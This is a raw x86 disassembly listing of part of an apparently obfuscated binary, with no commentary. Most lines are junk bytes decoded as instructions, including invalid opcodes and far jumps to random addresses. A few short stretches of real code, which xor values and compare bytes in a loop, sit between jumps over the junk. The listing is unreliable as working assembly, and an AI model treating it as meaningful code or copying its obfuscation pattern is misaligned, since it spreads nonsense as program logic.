  4049aa:	jmp    0x404d0a
  4049af:	fdiv   QWORD PTR [esi]
  4049b1:	dec    esp
  4049b2:	rsqrtps xmm6,XMMWORD PTR [ecx+0x5b]
  4049b6:	icebp  
  4049b7:	inc    eax
  4049b8:	sub    esp,DWORD PTR [ebp-0x15]
  4049bb:	mov    DWORD PTR [edx+ebp*4],ebp
  4049be:	ror    ecx,0x21
  4049c1:	jo     0x404a33
  4049c3:	cmp    eax,0xff70707d
  4049c8:	xchg   ebx,eax
  4049c9:	adc    BYTE PTR [esi-0x66051715],0xae
  4049d0:	mov    ebp,0x25887bdc
  4049d5:	xor    al,0x20
  4049d7:	std    
  4049d8:	and    dl,0x4f
  4049db:	test   BYTE PTR [ebp+ecx*8-0xb],dh
  4049df:	scas   eax,DWORD PTR es:[edi]
  4049e0:	aam    0x7f
  4049e2:	push   esp
  4049e3:	mov    WORD PTR [eax*1+0x526829b4],es
  4049ea:	neg    DWORD PTR [eax-0x3d]
  4049ed:	sbb    DWORD PTR [edi+edx*1-0x4fd50e5b],eax
  4049f4:	pop    eax
  4049f5:	int3   
  4049f6:	push   edi
  4049f7:	push   0xffffffac
  4049f9:	mov    edi,0xa67a20c2
  4049fe:	mov    DWORD PTR [ebx+eax*2+0x3775b0a9],eax
  404a05:	pop    edi
  404a06:	sbb    ebp,eax
  404a08:	test   al,0x5c
  404a0a:	clc    
  404a0b:	mov    dh,0x30
  404a0d:	ja     0x4049b0
  404a0f:	test   DWORD PTR [edi-0x355c37d6],ebp
  404a15:	add    ebx,ebx
  404a17:	jbe    0x4049a1
  404a19:	xlat   BYTE PTR ds:[ebx]
  404a1a:	push   ecx
  404a1b:	xchg   edx,eax
  404a1c:	pop    ecx
  404a1d:	pop    ss
  404a1e:	cmp    ebp,DWORD PTR [ebx+esi*8+0x4e9c3e83]
  404a25:	fld    QWORD PTR [esi]
  404a27:	and    ebp,ebp
  404a29:	xor    BYTE PTR [ecx-0x57],bl
  404a2c:	lods   eax,DWORD PTR ds:[esi]
  404a2d:	push   ecx
  404a2e:	dec    ecx
  404a2f:	jbe    0x4049bc
  404a31:	jae    0x4049ca
  404a33:	and    bh,bl
  404a35:	cmp    al,0xe6
  404a37:	and    al,0x3e
  404a39:	(bad)  
  404a3a:	xchg   esi,eax
  404a3b:	mov    ch,0xf9
  404a3d:	pop    es
  404a3e:	add    eax,DWORD PTR [edx+0x48]
  404a41:	(bad)  
  404a42:	adc    bh,BYTE PTR [edi+0x7e5cbb88]
  404a48:	pop    es
  404a49:	jl     0x4049e6
  404a4b:	mov    edi,0x7106cb94
  404a50:	xchg   edx,eax
  404a51:	jmp    0x404a85
  404a53:	mov    WORD PTR [ebx+ebx*8-0x3f],es
  404a57:	lods   eax,DWORD PTR ds:[esi]
  404a58:	retf   
  404a59:	repz dec ecx
  404a5b:	sub    al,0xba
  404a5d:	(bad)  
  404a5e:	cli    
  404a5f:	lods   al,BYTE PTR ds:[esi]
  404a60:	lds    ebp,FWORD PTR [esi]
  404a62:	popa   
  404a63:	jp     0x404a9c
  404a65:	cs push esi
  404a67:	sub    ah,ah
  404a69:	push   edx
  404a6a:	sbb    eax,0x30
  404a6d:	aaa    
  404a6e:	xchg   ecx,eax
  404a6f:	popa   
  404a70:	les    ecx,FWORD PTR [eax+0x36dc9c68]
  404a76:	fwait
  404a77:	ja     0x404a99
  404a79:	leave  
  404a7a:	and    al,0x4
  404a7c:	dec    ebx
  404a7d:	(bad)  
  404a7f:	es jge 0x404a84
  404a82:	push   ds
  404a83:	push   ss
  404a84:	sub    DWORD PTR [ebp-0x1c],eax
  404a87:	cmp    eax,0x4b1d65fa
  404a8c:	or     esi,DWORD PTR [ebp+eax*2+0x3a]
  404a90:	shr    DWORD PTR [ecx],cl
  404a92:	inc    edx
  404a93:	dec    esi
  404a94:	mov    ds:0xf53993e9,eax
  404a99:	mov    dl,0x77
  404a9b:	pushf  
  404a9c:	aad    0xc6
  404a9e:	or     al,0xde
  404aa0:	jmp    0x404a41
  404aa2:	loop   0x404ad2
  404aa4:	push   edi
  404aa5:	xor    bh,BYTE PTR [edi]
  404aa7:	xor    DWORD PTR [ebx+0x17],0xffffff80
  404aab:	lea    ebp,[edi]
  404aad:	add    eax,0x746294c0
  404ab2:	mov    ch,0x90
  404ab4:	xchg   edi,eax
  404ab5:	lahf   
  404ab6:	imul   esi,DWORD PTR [edx+0x5cea030f],0x93df1da
  404ac0:	lds    bp,DWORD PTR [ebx-0x49]
  404ac4:	test   al,0x46
  404ac6:	mov    edi,0x988158e
  404acb:	les    edi,FWORD PTR [ecx+0x11]
  404ace:	mul    DWORD PTR [esi]
  404ad0:	ret    0x6ec5
  404ad3:	lods   eax,DWORD PTR ds:[esi]
  404ad4:	dec    esi
  404ad5:	pop    es
  404ad6:	loop   0x404a68
  404ad8:	(bad)  
  404ada:	lds    edi,FWORD PTR [ebx-0x35]
  404add:	sar    DWORD PTR [edx],cl
  404adf:	call   0xbaff:0x5dba6349
  404ae6:	test   DWORD PTR [ecx-0x47bfea32],0xec1c6ed4
  404af0:	in     al,0x3f
  404af2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404af3:	imul   ebx,DWORD PTR [edi+edi*4-0x3b],0x57581a7
  404afb:	test   al,0x2f
  404afd:	dec    eax
  404afe:	(bad)  
  404aff:	push   edx
  404b00:	adc    bl,BYTE PTR [esi]
  404b02:	add    dh,BYTE PTR [eax-0x4df8bda9]
  404b08:	adc    al,0xe8
  404b0a:	mov    bh,bl
  404b0c:	in     al,0xbb
  404b0e:	rcr    BYTE PTR [ebp+0x1d],cl
  404b11:	addr16 sub al,0x90
  404b14:	fadd   st(4),st
  404b16:	add    eax,DWORD PTR [ecx]
  404b18:	into   
  404b19:	jnp    0x404aa4
  404b1b:	mov    bh,0xfc
  404b1d:	pushf  
  404b1e:	mov    dl,0x8b
  404b20:	dec    edi
  404b21:	mov    dh,BYTE PTR [esi]
  404b23:	mov    ecx,0x4fa54735
  404b28:	bound  ecx,QWORD PTR [edx+0x37]
  404b2b:	ror    al,1
  404b2d:	or     al,0xae
  404b2f:	cmp    al,0x9
  404b31:	test   DWORD PTR [ebp-0x4],esi
  404b34:	mov    cl,0x4c
  404b36:	mov    dl,0x66
  404b38:	in     eax,0xf
  404b3a:	jae    0x404ba7
  404b3c:	jns    0x404b4e
  404b3e:	das    
  404b3f:	mov    es,ebp
  404b41:	add    dl,dl
  404b43:	mov    edx,0xe3b0175b
  404b48:	cwde   
  404b49:	int3   
  404b4a:	shl    BYTE PTR [ebx-0x15d2ad75],cl
  404b50:	test   ah,bl
  404b52:	ret    
  404b53:	iret   
  404b54:	sbb    BYTE PTR [eax+0xe],ah
  404b57:	aaa    
  404b58:	add    BYTE PTR [ebp+0x66],ch
  404b5b:	pop    es
  404b5c:	xor    DWORD PTR [ecx],ebp
  404b5e:	retf   
  404b5f:	mov    ebp,0x46890cc0
  404b64:	jmp    0x404b46
  404b66:	and    BYTE PTR [edi+0x5d788acd],dl
  404b6c:	push   esi
  404b6d:	mov    ebx,0x2e1bb478
  404b72:	push   eax
  404b73:	fwait
  404b74:	adc    ah,BYTE PTR [edx]
  404b76:	or     DWORD PTR [eax],edx
  404b78:	dec    esp
  404b79:	arpl   WORD PTR [ebx-0x50fa1bd7],bp
  404b7f:	mov    al,ds:0x9b21bd15
  404b84:	dec    BYTE PTR ds:0x9ba43a1c
  404b8a:	sbb    al,0x59
  404b8c:	adc    DWORD PTR [ebp+0x47],ebx
  404b8f:	mov    ebx,0x341de855
  404b94:	xchg   ebx,eax
  404b95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b96:	icebp  
  404b97:	inc    eax
  404b98:	ret    0x9c39
  404b9b:	cdq    
  404b9c:	popa   
  404b9d:	add    BYTE PTR [ebx+0x40],ah
  404ba0:	xchg   ebx,eax
  404ba1:	je     0x404b30
  404ba3:	mov    dl,0xdc
  404ba5:	pop    ds
  404ba6:	sbb    edi,edx
  404ba8:	push   ebp
  404ba9:	xlat   BYTE PTR ds:[ebx]
  404baa:	dec    ebx
  404bab:	mov    ebp,0x3863a1bb
  404bb0:	aad    0xd7
  404bb2:	jle    0x404ba3
  404bb4:	jecxz  0x404bb9
  404bb6:	mov    esi,DWORD PTR [edx]
  404bb8:	mov    ds,edx
  404bba:	jmp    0xe85d:0xeb739d9d
  404bc1:	data16 adc bh,BYTE PTR [esi]
  404bc4:	fisttp WORD PTR [eax-0x16]
  404bc7:	sbb    bl,dl
  404bc9:	daa    
  404bca:	push   edx
  404bcb:	adc    al,0x3d
  404bcd:	or     ch,BYTE PTR [edx+edx*8+0x5c]
  404bd1:	jmp    0xfc4a:0x10496056
  404bd8:	jmp    0x1fa2:0x45cc7df6
  404bdf:	sbb    bh,bh
  404be1:	mov    ah,0x6b
  404be3:	into   
  404be4:	bound  ebp,QWORD PTR [edx-0x5c666a84]
  404bea:	rcr    BYTE PTR [esi],0x35
  404bed:	(bad)  
  404bee:	retf   0x6b6e
  404bf1:	popa   
  404bf2:	cmc    
  404bf3:	push   ss
  404bf4:	cli    
  404bf5:	repnz mov esi,0x714a7352
  404bfb:	js     0x404bc8
  404bfd:	aas    
  404bfe:	sub    ch,0x1c
  404c01:	daa    
  404c02:	call   0x3da4e59c
  404c07:	call   0x14422ed3
  404c0c:	fcom   QWORD PTR [ebx+edx*2+0x24]
  404c10:	xchg   DWORD PTR [edi-0x2f],esi
  404c13:	int3   
  404c14:	cmp    al,bh
  404c16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c17:	out    0x2b,eax
  404c19:	add    dh,ah
  404c1b:	mov    ebx,DWORD PTR [eax]
  404c1d:	outs   dx,DWORD PTR ds:[esi]
  404c1e:	pushf  
  404c1f:	jne    0x404c8a
  404c21:	shl    DWORD PTR [ecx],1
  404c23:	inc    ecx
  404c24:	cmp    BYTE PTR ds:0x53572abf,dl
  404c2a:	in     al,0xd5
  404c2c:	sub    DWORD PTR [ecx+0x7618e4f4],0x1f
  404c33:	xchg   edx,eax
  404c34:	scas   eax,DWORD PTR es:[edi]
  404c35:	(bad)  
  404c36:	dec    esi
  404c37:	out    0x9b,eax
  404c39:	icebp  
  404c3a:	nop
  404c3b:	and    DWORD PTR [ecx],ebp
  404c3d:	xchg   esp,eax
  404c3e:	(bad)  
  404c3f:	cli    
  404c40:	or     ebp,eax
  404c42:	mov    DWORD PTR [edi+0x2eb23f22],0x286b7fcb
  404c4c:	sar    DWORD PTR [edi],0xf2
  404c4f:	jne    0x404c4a
  404c51:	adc    DWORD PTR [edx],esi
  404c53:	aaa    
  404c54:	sbb    al,0x96
  404c56:	fwait
  404c57:	call   0xa0df:0x671a8bdf
  404c5e:	or     eax,0x863b5945
  404c63:	xchg   esp,eax
  404c64:	mov    eax,0x5e0512b3
  404c69:	cdq    
  404c6a:	mov    DWORD PTR [edi],edx
  404c6c:	ret    
  404c6d:	and    edx,DWORD PTR ds:0xe8ceadcf
  404c73:	mov    bh,0x6c
  404c75:	int3   
  404c76:	shl    BYTE PTR [edi+edx*8-0x76],0xa7
  404c7b:	and    al,0x97
  404c7d:	adc    esp,DWORD PTR [edi-0x6ad949f3]
  404c83:	ja     0x404c7e
  404c85:	lea    eax,[ecx-0x5a41bdc4]
  404c8b:	sub    al,cl
  404c8d:	or     eax,0x38d9e24c
  404c92:	rcr    BYTE PTR ds:0x376ee767,0xb0
  404c99:	xor    BYTE PTR [ecx],dl
  404c9b:	popf   
  404c9c:	fld    TBYTE PTR [edi+0x2e61a392]
  404ca2:	and    al,0x1a
  404ca4:	fmul   st(6),st
  404ca6:	call   0xf78:0x4b39398a
  404cad:	clc    
  404cae:	sar    BYTE PTR [edi-0x236e8ab0],1
  404cb4:	mov    bl,0x22
  404cb6:	xor    eax,0xe99e4616
  404cbb:	aam    0x9a
  404cbd:	out    dx,eax
  404cbe:	in     al,0x91
  404cc0:	cdq    
  404cc1:	popf   
  404cc2:	std    
  404cc3:	dec    ecx
  404cc4:	mov    bh,0xcf
  404cc6:	mov    eax,ds:0x5f480eb8
  404ccb:	psubusb mm3,mm3
  404cce:	add    al,0xef
  404cd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404cd1:	mov    dh,BYTE PTR [edi+0x2f]
  404cd4:	xlat   BYTE PTR ds:[ebx]
  404cd5:	lea    esi,[edx+0xa]
  404cd8:	jg     0x404cfb
  404cda:	rcr    BYTE PTR [ebx+0x4e271308],1
  404ce0:	add    BYTE PTR ss:[ecx],dh
  404ce3:	popa   
  404ce4:	jge    0x404d45
  404ce6:	or     eax,0x9be3848d
  404ceb:	test   ah,ch
  404ced:	stos   BYTE PTR es:[edi],al
  404cee:	mov    eax,0x1a240cce
  404cf3:	push   ds
  404cf4:	dec    eax
  404cf5:	fsub   st(5),st
  404cf7:	push   esp
  404cf8:	popf   
  404cf9:	loopne 0x404ccf
  404cfb:	pop    ss
  404cfc:	lods   eax,DWORD PTR ds:[esi]
  404cfd:	lea    esp,[edi-0x5962e69b]
  404d03:	test   BYTE PTR [edx-0x5b],dl
  404d06:	int3   
  404d07:	call   DWORD PTR [ebp+0x5a]
  404d0a:	add    eax,edi
  404d0c:	mov    DWORD PTR ds:0x42e6ff,0xe58
  404d16:	mov    edi,DWORD PTR [ebp-0x14]
  404d19:	mov    DWORD PTR ds:0x42e6eb,0x3918
  404d23:	mov    BYTE PTR [ebp+edi*1-0x58],al
  404d27:	jmp    0x405087
  404d2c:	or     DWORD PTR [ebp-0x1d],esi
  404d2f:	daa    
  404d30:	arpl   WORD PTR [ecx+0x5bcd71c9],si
  404d36:	fisttp QWORD PTR [eax+0x22]
  404d39:	pusha  
  404d3a:	and    al,0x3e
  404d3c:	xchg   esi,eax
  404d3d:	cs jo  0x404db0
  404d40:	cmp    eax,0x3870707d
  404d45:	pop    ecx
  404d46:	test   BYTE PTR [eax],0x5b
  404d49:	mov    bh,0xd2
  404d4b:	push   ebx
  404d4c:	mov    al,0x5b
  404d4e:	call   0x96a5:0x5c774590
  404d55:	pop    edx
  404d56:	add    eax,0xe938f62e
  404d5b:	xor    DWORD PTR ds:0x22533e4b,esi
  404d61:	sti    
  404d62:	ds popa 
  404d64:	mov    bl,0xd0
  404d66:	or     bh,BYTE PTR [esi+0x1e]
  404d69:	xchg   BYTE PTR [ecx+edx*1],bh
  404d6c:	loopne 0x404dbe
  404d6e:	mov    cs,edi
  404d70:	fwait
  404d71:	ins    BYTE PTR es:[edi],dx
  404d72:	xor    eax,0xc39a2189
  404d77:	inc    ebp
  404d78:	jb     0x404d7e
  404d7a:	pop    ss
  404d7b:	xchg   edx,eax
  404d7c:	mov    BYTE PTR [eax-0x45],0x56
  404d80:	mov    BYTE PTR [ebp+eax*1+0x6bbd9562],cl
  404d87:	fucomip st,st(7)
  404d89:	stc    
  404d8a:	xchg   edi,eax
  404d8b:	shr    bl,0xb4
  404d8e:	sub    eax,0xec8db3a5
  404d93:	pop    ebp
  404d94:	sbb    edi,ebx
  404d96:	getsec 
  404d98:	ins    BYTE PTR es:[edi],dx
  404d99:	and    DWORD PTR [ecx-0x57],esi
  404d9c:	add    DWORD PTR ds:0x118b15c9,ebp
  404da2:	jg     0x404d60
  404da4:	js     0x404dd2
  404da6:	sbb    ebx,ecx
  404da8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404da9:	iret   
  404daa:	xor    DWORD PTR ds:0x667e4a68,0x72
  404db1:	dec    esi
  404db2:	lahf   
  404db3:	retf   0x81b2
  404db6:	or     al,0x14
  404db8:	cmp    esp,DWORD PTR [ecx+0x24]
  404dbb:	ins    BYTE PTR es:[edi],dx
  404dbc:	cdq    
  404dbd:	test   BYTE PTR gs:[ebx],cl
  404dc0:	outs   dx,DWORD PTR ds:[esi]
  404dc1:	mov    eax,0x57359ac3
  404dc6:	add    eax,0xea8fea7e
  404dcb:	jmp    FWORD PTR [ebp-0x23a8277e]
  404dd1:	sub    BYTE PTR [eax],bh
  404dd3:	pop    ds
  404dd4:	or     eax,0x482de4b5
  404dd9:	xchg   ebx,eax
  404dda:	xchg   edx,eax
  404ddb:	ins    BYTE PTR es:[edi],dx
  404ddc:	add    ch,BYTE PTR [esi]
  404dde:	inc    ebx
  404ddf:	popa   
  404de0:	adc    BYTE PTR [edx],al
  404de2:	and    DWORD PTR [edx],eax
  404de4:	sbb    ah,dl
  404de6:	xchg   edx,eax
  404de7:	daa    
  404de8:	sbb    BYTE PTR [eax-0x40],0x73
  404dec:	cmp    DWORD PTR [eax+esi*2],0xffffffb6
  404df0:	retf   0x63ca
  404df3:	jle    0x404e1a
  404df5:	(bad)  
  404df6:	ja     0x404e19
  404df8:	ror    BYTE PTR [eax+0x7],cl
  404dfb:	mov    ah,0x3c
  404dfd:	sub    ebx,ebx
  404dff:	push   eax
  404e00:	loope  0x404e2c
  404e02:	iret   
  404e03:	ret    
  404e04:	std    
  404e05:	xchg   esi,eax
  404e06:	jb     0x404e2e
  404e08:	rcl    DWORD PTR [ebp-0x63],1
  404e0b:	mov    cl,0x30
  404e0d:	sub    al,0x50
  404e0f:	clc    
  404e10:	mov    esp,DWORD PTR [esi-0x6d123933]
  404e16:	adc    edx,ebx
  404e18:	(bad)
  404e1d:	add    ebx,DWORD PTR [eax+0x3f]
  404e20:	cmp    edi,DWORD PTR ss:[ebp+0x6a]
  404e24:	push   0x780f4001
  404e29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e2a:	pop    ss
  404e2b:	mov    eax,0xb0756b75
  404e30:	jmp    0x6775:0x663b70be
  404e37:	mov    dl,0xd5
  404e39:	repz mov ?,WORD PTR [edi+0x55048649]
  404e40:	aas    
  404e41:	xchg   ecx,eax
  404e42:	popa   
  404e43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e44:	pop    es
  404e45:	push   ecx
  404e46:	vmovlps xmm6,xmm6,QWORD PTR es:[eax]
  404e4b:	arpl   WORD PTR [esp+ecx*8],bx
  404e4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e4f:	in     al,dx
  404e50:	ret    
  404e51:	leave  
  404e52:	addr16 dec esi
  404e54:	fstp   QWORD PTR [esi-0x3f]
  404e57:	loope  0x404e57
  404e59:	out    0xd7,al
  404e5b:	jae    0x404e04
  404e5d:	hlt    
  404e5e:	mov    edx,0xf6c48a99
  404e63:	stc    
  404e64:	xchg   DWORD PTR [edx],edi
  404e66:	and    esp,esi
  404e68:	push   cs
  404e69:	icebp  
  404e6a:	ret    
  404e6b:	xchg   BYTE PTR [ebx],dh
  404e6d:	xor    al,BYTE PTR ss:[ebp+0x39]
  404e71:	mov    cl,0x2
  404e73:	cmp    edi,DWORD PTR [esp+ecx*1-0x46]
  404e77:	mov    edx,0x1c95f177
  404e7c:	out    0x49,al
  404e7e:	stos   BYTE PTR es:[edi],al
  404e7f:	inc    esi
  404e80:	ficomp WORD PTR [ebx-0xc8711be]
  404e86:	outs   dx,DWORD PTR ds:[esi]
  404e87:	mov    edx,0x6d283c44
  404e8c:	pop    esi
  404e8d:	sbb    al,0xc2
  404e8f:	inc    eax
  404e90:	mov    ecx,DWORD PTR ds:0xb5608547
  404e96:	pop    ebp
  404e97:	add    edx,DWORD PTR [edi+0x793ed9bb]
  404e9d:	mov    eax,DWORD PTR [edx-0x2d]
  404ea0:	iret   
  404ea1:	xchg   BYTE PTR [ebx],dh
  404ea3:	xor    bh,BYTE PTR [edi+0x17]
  404ea6:	lds    ebx,FWORD PTR [ebx+0x42]
  404ea9:	xchg   ebp,eax
  404eaa:	pusha  
  404eab:	popa   
  404eac:	inc    eax
  404ead:	cmp    DWORD PTR [ebp-0x4],ecx
  404eb0:	sub    al,0x85
  404eb2:	mov    ds:0xc3f7311f,eax
  404eb7:	adc    DWORD PTR [edi],edx
  404eb9:	push   ebp
  404eba:	ds xchg edi,eax
  404ebc:	syscall 
  404ebe:	mov    edx,0xca2c31f9
  404ec3:	test   DWORD PTR [esi],ecx
  404ec5:	mov    bl,0x1b
  404ec7:	jns    0x404ef2
  404ec9:	mov    WORD PTR [ecx+eax*4-0xb8d4259],cs
  404ed0:	adc    eax,0xc6452227
  404ed5:	and    DWORD PTR [eax-0x1e],ecx
  404ed8:	je     0x404ea8
  404eda:	xchg   ecx,eax
  404edb:	in     al,dx
  404edc:	xchg   esi,eax
  404edd:	jle    0x404e80
  404edf:	aaa    
  404ee0:	jo     0x404f44
  404ee2:	ss ret 0xe440
  404ee6:	sar    BYTE PTR [eax-0x44],1
  404ee9:	adc    al,0x44
  404eeb:	shl    DWORD PTR [ebp+0x78],0xfd
  404eef:	test   bl,cl
  404ef1:	add    al,0xb5
  404ef3:	cmc    
  404ef4:	call   0x54cfed96
  404ef9:	sbb    bh,BYTE PTR ds:0xe955f820
  404eff:	cmp    ecx,ecx
  404f01:	loopne 0x404f0f
  404f03:	xchg   edi,eax
  404f04:	lods   eax,DWORD PTR ds:[esi]
  404f05:	jnp    0x404efd
  404f07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f08:	outs   dx,DWORD PTR ds:[esi]
  404f09:	imul   ebp,DWORD PTR [ebx],0xbb14a983
  404f0f:	imul   ecx,edx,0xffffff8f
  404f12:	repnz or esp,0xffffffa9
  404f16:	stos   BYTE PTR es:[edi],al
  404f17:	mov    al,0x91
  404f19:	dec    edi
  404f1a:	(bad)  
  404f1b:	cld    
  404f1c:	(bad)  
  404f1d:	inc    ebp
  404f1e:	xchg   ecx,eax
  404f1f:	mov    BYTE PTR [ecx],0x41
  404f22:	mov    BYTE PTR [edx],cl
  404f24:	stc    
  404f25:	cli    
  404f26:	jnp    0x404ead
  404f28:	(bad)  
  404f29:	hlt    
  404f2a:	mov    ecx,0x870a1060
  404f2f:	cmc    
  404f30:	(bad)  
  404f31:	mov    al,ds:0x6ea45ef3
  404f36:	aaa    
  404f37:	dec    esp
  404f38:	sbb    DWORD PTR [edi],esi
  404f3a:	and    al,0xec
  404f3c:	jecxz  0x404f97
  404f3e:	out    dx,eax
  404f3f:	das    
  404f40:	push   edi
  404f41:	sahf   
  404f42:	jl     0x404fbd
  404f44:	repnz in eax,dx
  404f46:	retf   
  404f47:	sub    bh,cl
  404f49:	add    BYTE PTR [edx+0x29],ch
  404f4c:	adc    eax,0x9374b9ef
  404f51:	ret    
  404f52:	mov    ds:0x32173fe8,eax
  404f57:	sbb    ebx,esi
  404f59:	ins    DWORD PTR es:[edi],dx
  404f5a:	sbb    eax,0xd5a81bee
  404f5f:	nop
  404f60:	fldenv [ecx-0x59]
  404f63:	sub    BYTE PTR [edi+eiz*2-0x5d],ch
  404f67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f68:	adc    ch,bl
  404f6a:	mov    edi,0xa67a2009
  404f6f:	sbb    eax,0xb6261619
  404f74:	cmp    edi,DWORD PTR [ebx]
  404f76:	rcr    eax,1
  404f78:	in     eax,dx
  404f79:	scas   eax,DWORD PTR es:[edi]
  404f7a:	mov    al,0xc4
  404f7c:	inc    eax
  404f7d:	ja     0x404f92
  404f7f:	mov    bh,0xfc
  404f81:	mov    al,0x2d
  404f83:	pop    es
  404f84:	sbb    bl,cl
  404f86:	imul   esi,DWORD PTR [ecx+0x48],0x8f533547
  404f8d:	sbb    eax,0x667c5b57
  404f92:	mov    bh,0xe9
  404f94:	xor    bl,al
  404f96:	ds or  al,0x3
  404f99:	es mov bh,0xee
  404f9c:	add    bh,BYTE PTR [ebp-0x13]
  404f9f:	mov    ch,0x36
  404fa1:	pop    esp
  404fa2:	mov    BYTE PTR [esi+0x38],cl
  404fa5:	pop    ss
  404fa6:	or     eax,DWORD PTR [edi+eax*2-0x4]
  404faa:	or     ah,BYTE PTR [esp+eax*4+0x139482e0]
  404fb1:	sbb    BYTE PTR [ecx-0x73ba1aca],dl
  404fb7:	pop    edx
  404fb9:	jmp    0x64c5e94c
  404fbe:	add    bh,BYTE PTR [ebx+0x52]
  404fc1:	stc    
  404fc2:	cmp    edi,DWORD PTR [ebx+0x64867ace]
  404fc8:	push   ebx
  404fc9:	scas   eax,DWORD PTR es:[edi]
  404fca:	loopne 0x404fd9
  404fcc:	fnstsw WORD PTR [edx+ebp*1-0x64]
  404fd0:	(bad)  
  404fd1:	(bad)  
  404fd2:	dec    ebx
  404fd3:	inc    ecx
  404fd4:	sbb    edx,esi
  404fd6:	ja     0x404f8f
  404fd8:	jmp    0xa89d:0xd1bd4d0
  404fdf:	cs loopne 0x404fdb
  404fe2:	(bad)  
  404fe3:	jl     0x404fc4
  404fe5:	mov    bl,0x5d
  404fe7:	aas    
  404fe8:	fild   DWORD PTR [edx+esi*8-0x4c]
  404fec:	imul   di,ax,0xdb97
  404ff1:	push   es
  404ff2:	fmul   QWORD PTR [ebx+0x4c802606]
  404ff8:	shl    BYTE PTR ds:0xd09aa207,0x2b
  404fff:	and    esi,DWORD PTR [esi+0x70]
  405002:	pop    ds
  405003:	leave  
  405004:	pop    ecx
  405005:	pop    eax
  405006:	mov    dh,0x33
  405008:	jno    0x404fef
  40500a:	(bad)  
  40500b:	dec    ebx
  40500c:	cmc    
  40500d:	out    dx,eax
  40500e:	sub    BYTE PTR [esi],bl
  405010:	(bad)  
  405011:	xor    eax,0xce4329d9
  405016:	rcr    BYTE PTR [ecx+0x106643d9],0x74
  40501d:	ja     0x404fb8
  40501f:	xchg   edi,eax
  405020:	or     DWORD PTR [ecx+0x6f],ebx
  405023:	adc    eax,0x9f42494d
  405028:	nop
  405029:	jecxz  0x40504e
  40502b:	and    al,BYTE PTR [ecx]
  40502d:	pusha  
  40502e:	sbb    al,0xd
  405030:	dec    ecx
  405031:	aas    
  405032:	xor    BYTE PTR [eax],0x64
  405035:	cli    
  405036:	nop
  405037:	pcmpgtd mm1,QWORD PTR [esi+0x27]
  40503b:	ret    0xd987
  40503e:	xchg   ecx,eax
  40503f:	sbb    edi,DWORD PTR fs:[eax]
  405042:	data16 sbb BYTE PTR [edi-0xdc7f7d5],0x7b
  40504a:	outs   dx,DWORD PTR ds:[esi]
  40504b:	ret    
  40504c:	add    bh,BYTE PTR [edx+0x5b]
  40504f:	cmp    BYTE PTR [esi+0x25c8073],bl
  405055:	mov    ds:0xf3cc83e,eax
  40505a:	ja     0x4050a2
  40505c:	out    dx,al
  40505d:	jnp    0x4050ce
  40505f:	add    BYTE PTR [ebx+0xb],0xfb
  405063:	dec    ebp
  405064:	mov    ebx,0xbbf54e9c
  405069:	out    0xf1,eax
  40506b:	in     eax,dx
  40506c:	repnz rol ecx,1
  40506f:	arpl   WORD PTR [ecx+0x6f],dx
  405072:	add    al,0x68
  405074:	test   al,0xda
  405076:	adc    esi,DWORD PTR [edx]
  405078:	arpl   WORD PTR [ebx-0x3b],di
  40507b:	sbb    ebp,DWORD PTR [ebx+0x2]
  40507e:	jge    0x405095
  405080:	add    DWORD PTR ds:[ebp-0x72],ebp
  405084:	fwait
  405085:	in     eax,dx
  405086:	jl     0x405013
  405088:	inc    ebp
  405089:	hlt    
  40508a:	inc    edx
  40508b:	cmp    edx,eax
  40508d:	jne    0x40493d
  405093:	pop    edi
  405094:	pop    ebx
  405095:	mov    eax,DWORD PTR [ebp-0x8]
  405098:	mov    edx,DWORD PTR [ebp+0x10]
  40509b:	xor    eax,ecx
  40509d:	add    eax,esi
  40509f:	mov    DWORD PTR [edx],eax
  4050a1:	mov    eax,DWORD PTR [ebp-0x8]
  4050a4:	xor    eax,ecx
  4050a6:	add    eax,esi
  4050a8:	mov    DWORD PTR [ebp+0x8],eax
  4050ab:	mov    eax,DWORD PTR [ebp+0x8]
  4050ae:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4050b2:	mov    dl,BYTE PTR [ebp-0x1]
  4050b5:	cmp    al,dl
  4050b7:	je     0x4050fa
  4050bd:	mov    eax,DWORD PTR [ebp+0x8]
  4050c0:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4050c4:	mov    edx,DWORD PTR [ebp+0xc]
  4050c7:	cmp    al,BYTE PTR [edx]
  4050c9:	jne    0x405480
  4050cf:	mov    eax,DWORD PTR [ebp-0x8]
  4050d2:	mov    edx,DWORD PTR [ebp+0xc]
  4050d5:	movsx  edx,BYTE PTR [edx]
  4050d8:	xor    eax,ecx
  4050da:	add    eax,esi
  4050dc:	cmp    edx,eax
  4050de:	je     0x405114
  4050e4:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4050eb:	lea    eax,[ebp-0x18]
  4050ee:	mov    DWORD PTR [ebp-0x14],eax
  4050f1:	mov    eax,DWORD PTR [ebp-0x14]
  4050f4:	add    DWORD PTR [eax],0x705fa8f
  4050fa:	mov    eax,DWORD PTR [ebp-0x10]
  4050fd:	mov    edx,DWORD PTR [ebp+0x8]
  405100:	xor    eax,ecx
  405102:	lea    eax,[eax+edx*1+0x32729c]
  405109:	mov    DWORD PTR [ebp+0x8],eax
  40510c:	inc    DWORD PTR [ebp+0xc]
  40510f:	jmp    0x4050ab
  405114:	mov    eax,DWORD PTR [ebp-0x10]
  405117:	xor    eax,ecx
  405119:	mov    ecx,DWORD PTR [ebp+0x10]
  40511c:	add    eax,esi
  40511e:	mov    DWORD PTR [ecx],eax
  405120:	jmp    0x405480
  405125:	xchg   edi,eax
  405126:	rol    DWORD PTR ds:0xb5744198,1
  40512c:	icebp  
  40512d:	lods   al,BYTE PTR ds:[esi]
  40512e:	add    al,0x98
  405130:	rcl    DWORD PTR [esi-0x7c],0x3
  405134:	dec    esi
  405135:	push   ebx
  405136:	sub    esi,DWORD PTR [eax+0x70]
  405139:	cmp    eax,0xba70707d
  40513e:	jecxz  0x40510c
  405140:	and    dl,BYTE PTR [ebp+esi*2+0x27ab09f1]
  405147:	inc    ebx
